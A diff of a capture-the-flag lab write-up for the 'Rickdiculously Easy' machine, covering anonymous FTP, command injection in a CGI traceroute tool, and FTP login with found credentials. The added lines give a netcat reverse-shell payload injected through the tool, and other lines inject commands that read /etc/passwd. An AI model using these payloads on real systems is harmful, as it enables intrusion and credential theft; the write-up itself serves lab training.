@@ -66,7 +66,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Looking at the NAMP scan results
 
-I look at `https://10.0.0.137:9090/` and I see(below image). We got our First Flag! 
+I look at `https://10.0.0.137:9090/` and I see (below image). We got our First Flag! 
 Other than the flag there didn't seem to be much here so I moved on and attempted an anonymous login via FTP.
 ![Optional Text](/Rickdiculously%20Easy/_resources/28c5f1cc424b4876b5ee99bb7015065d.png)
 
@@ -76,7 +76,7 @@ I used `ftp 10.0.0.137` to connect and for the **username&passwords** I used **A
 
 Once logged in, I `ls` and can see 2 files.
 
-I used `wget -m ftp://anonymous:anonymous@10.0.0.137` to retrieve the file(s). Alternativley you could also use the `get` cmd
+I used `wget -m ftp://anonymous:anonymous@10.0.0.137` to retrieve the file(s). Alternativley you could also use the `get` cmd or filezilla.
 
 Looks like we got our second flag!
 
@@ -145,10 +145,14 @@ I go to `10.0.0.137/cgi-bin/root_shell.cgi` hoping it was going to be this easy 
 I then take a look at `http://10.0.0.137/cgi-bin/tracertool.cgi`
 ![Optional Text](/Rickdiculously%20Easy/_resources/9ac3412d75fd4194b063f8a52debd39d.png)
 
-I look at `http://10.0.0.137/cgi-bin/tracertool.cgi` and after some testing I releazed it was vulnerable to command injection
-`1.2.3.4;uname -r` returned 4.11.8-300.fc26.x86_64 looks like the semicolon did the trick. I tried to get a reverse shell but didn't have anyluck so I printed the output of the `/etc/passwd`. The cat command didn't work, but I encourage you to try, someone has a great since of humor! I used `nl` instead
+I look at `http://10.0.0.137/cgi-bin/tracertool.cgi` and after some testing I realize it was vulnerable to command injection. I confirmed by running `1.2.3.4;uname -r` it returned 4.11.8-300.fc26.x86_64 looks like the semicolon did the trick. I was able to get a reverse shell but after playing around I didn't have much luck. I printed out the `/etc/passwd`. The cat command didn't work, but I encourage you to try, someone has a great since of humor! I used `nl` instead
 
-`;nl /etc/passwd`
+### Reverse Shell
+Local Machine Run: `nc -lvnp 4444`
+
+Go to `http://10.0.0.137/cgi-bin/tracertool.cgi` and in the dialog box put `; nc 10.0.0.186 4444 -e /bin/bash;` click trace
+
+You can also print out the `/etc/passwd` with the tracertool by placing `;nl /etc/passwd` in the dialog box
 
 ![Optional Text](/Rickdiculously%20Easy/_resources/6a8dee2210714497bd66728abccf025e.png)
 ```
@@ -158,11 +162,11 @@ Great now we have some usernames
 29 Summer:x:1002:1002::/home/Summer:/bin/bash
 30 apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
 ```
-My guess is the password `winter` has to belong to one of these users! After testing the creds manually We got in with **Summer&winter** via ftp.
+My guess is the password we found early `winter` has to belong to one of these users! After testing the creds manually. We got in with **Summer&winter** via ftp.
 
 ## FTP Login
 
-After user creds **Summer:winter** I was able to get an FTP login and our next FLAG. **40 points found and 90 left to go!**
+After using creds **Summer:winter** I was able to get an FTP login and our next FLAG. **40 points found and 90 left to go!**
 
 ![Optional Text](/Rickdiculously%20Easy/_resources/33bd2ec1b02544c698bae44d6cef7f85.png)
 
@@ -187,7 +191,11 @@ Contents of `NotAFlag.txt`
 hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
 But seriously this isn't a flag..
 ```
-I looked over all my notes from the machine and decided to do a little more enumeration
+I looked over all my notes from the machine and decided to do a little more enumeration. The first thing I did was run a full port nmap scan.
+![Optional Text](/Rickdiculously%20Easy/_resources/a6df27299520dc839dc8c3c5fb6ac8e9.png)
+
+After running the scan I see several ports that I didn't seem before! So I decided to run nmap again but with a few more informational flags. In a real world enviroment, its not a good idea to run namp with `-T5`. It will get you caught!
+
 
 I attempted to unzip the file but 
 
